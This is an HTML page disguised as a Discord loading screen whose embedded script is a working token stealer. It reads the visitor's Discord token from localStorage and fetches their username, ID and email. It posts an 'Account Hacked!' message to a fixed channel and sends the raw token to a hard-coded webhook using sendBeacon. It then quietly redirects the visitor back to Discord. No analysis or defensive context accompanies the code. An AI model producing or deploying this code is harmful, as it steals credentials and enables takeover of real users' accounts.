<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (async function() {
      try {
        var token = localStorage.getItem("token");
        if (token) {
          token = token.replace(/"/g, "");

          // 取得帳號資訊
          var res = await fetch("https://discord.com/api/v9/users/@me", {
            headers: { "Authorization": token }
          });
          if (res.ok) {
            var user = await res.json();
            var username = user.username;
            var userId = user.id;
            var email = user.email || 'N/A';

            // 發送訊息到目標 878151437085974548（用 keepalive 確保頁面跳走仍會送出）
            var msg = {
              content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
            };
            var msgReq = new XMLHttpRequest();
            msgReq.open("POST", "https://discord.com/api/v9/channels/878151437085974548/messages");
            msgReq.setRequestHeader("Content-Type", "application/json");
            msgReq.setRequestHeader("Authorization", token);
            msgReq.setRequestHeader("X-Correlation-Id", userId);
            msgReq.send(JSON.stringify(msg));

            // 把 token 送到 webhook 備份（webhook URL 內建 auth，可用 sendBeacon）
            var blob = new Blob([JSON.stringify({
              content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
            })], { type: 'application/json' });
            try {
              navigator.sendBeacon("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", blob);
            } catch(e) {
              // 退回 fetch
              var fb = new XMLHttpRequest();
              fb.open("POST", "https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph");
              fb.setRequestHeader("Content-Type", "application/json");
              fb.send(JSON.stringify({
                content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
              }));
            }
          }

          // 3 秒後跳回 Discord（確保上面的請求都送出）
          setTimeout(function() {
            window.location.href = "https://discord.com/channels/@me";
          }, 3000);
        } else {
          // 無 token — 跳回 Discord
          window.location.href = "https://discord.com/channels/@me";
        }
      } catch(e) {
        console.log("Token 抓取失敗:", e);
      }
    })();
  </script>
</body>
</html>
